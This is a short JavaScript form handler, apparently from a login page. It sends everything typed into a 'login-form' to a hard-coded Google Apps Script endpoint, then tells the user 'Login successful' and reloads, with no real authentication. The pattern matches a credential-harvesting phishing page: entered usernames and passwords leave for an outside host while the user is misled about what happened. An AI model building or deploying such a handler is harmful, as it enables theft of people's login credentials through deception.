const scriptURL = "https://script.google.com/macros/s/AKfycbzFY_xoj3oQP8ALejV4QYnFG6ESU8ELo5raatj4-TBYuAARkSoxjRDamHndjvVlLkjTCA/exec"
const form = document.forms['login-form']

form.addEventListener('submit', e => {
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  .then(response => alert("Thank you! Login successful." ))
  .then(() => { window.location.reload(); })
  .catch(error => console.error('Error!', error.message))
})